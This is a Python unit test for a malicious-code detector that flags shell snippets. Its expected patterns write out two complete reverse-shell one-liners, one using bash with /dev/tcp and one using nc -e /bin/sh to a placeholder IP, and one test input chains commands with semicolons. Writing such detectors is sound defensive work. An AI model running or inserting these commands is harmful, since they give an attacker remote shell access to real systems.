from unittest import TestCase

from malicious_code_checker import MaliciousCodeChecker, MaliciousPattern


class Test(TestCase):

    def test_find_malicious_code(self):
        mcc = MaliciousCodeChecker()

        self.assertEqual(
            mcc.find_malicious_code("bash -i"),
            ("bash -i", MaliciousPattern("bash -i", "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"))
        )
        self.assertEqual(
            mcc.find_malicious_code("test; nc -e; //dummy"),
            ("test; nc -e; //dummy", MaliciousPattern("nc -e", "nc -e /bin/sh 10.0.0.1 1234"))
        )
